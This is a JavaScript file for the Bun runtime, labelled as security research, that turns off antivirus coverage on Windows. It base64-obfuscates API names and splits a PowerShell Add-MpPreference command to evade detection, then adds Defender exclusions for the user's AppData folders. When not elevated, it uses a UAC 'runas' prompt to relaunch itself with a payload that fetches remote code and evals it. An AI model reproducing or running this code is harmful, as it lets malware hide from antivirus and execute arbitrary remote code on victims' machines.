// excl.js - Security Research: Jan/Bun Fileless UAC & Defender Exclusion
(async () => {
  // Obfuscated strings to bypass static analysis
  const _s32 = Buffer.from("c2hlbGwsMzIuZGxs", 'base64').toString().replace(',', ''); // shell32.dll
  const _sEx = Buffer.from("U2hlbGxFeGVjdXRlVw==", 'base64').toString(); // ShellExecuteW
  const _ra = Buffer.from("cnVuYXM=", 'base64').toString(); // runas

  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  const lib = dlopen(_s32, {
    [_sEx]: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  const checkAdmin = async () => {
    try {
      return (await Bun.spawn({ cmd: ["net", "session"] }).exited) === 0;
    } catch (e) { return false; }
  };

  const is_admin = await checkAdmin();
  console.log(`🚀 PID: ${process.pid} | Admin: ${is_admin}`);

  if (is_admin) {
    console.log("✅ ADMIN SESSION GRANTED");
    
    // Collect both Roaming and Local AppData
    const paths = [process.env.APPDATA, process.env.LOCALAPPDATA].filter(Boolean);
    
    for (const target of paths) {
      console.log(`🛡️ Adding exclusion for: ${target}`);
      
      // PowerShell command split to evade simple string matching
      const p1 = "Add-";
      const p2 = "MpPreference";
      const fullCmd = `${p1}${p2} -ExclusionPath '${target}'`;
      
      const proc = Bun.spawn({
        cmd: ["powershell", "-Command", fullCmd],
        stderr: "pipe"
      });

      const err = await new Response(proc.stderr).text();
      if (await proc.exited === 0) {
          console.log(`✨ SUCCESS: ${target} added.`);
      } else {
          console.log("❌ ERROR:", err.trim());
      }
    }

    console.log("\nPress Enter to exit...");
    for await (const line of console) break;
    return;
  }

  // UAC RECURSION
  console.log("❌ Limited privileges. Requesting Elevation...");
  
  const url = "https://githubusercontent.com";
  // Obfuscated fetch/eval payload
  const payload = `fetch('${url}').then(r=>r.text()).then(eval)`;

  const res = lib.symbols[_sEx](0, toPtr(_ra), toPtr("bun.exe"), toPtr(`-e "${payload}"`), 0, 1);

  if (res > 32) process.exit(0);
})();
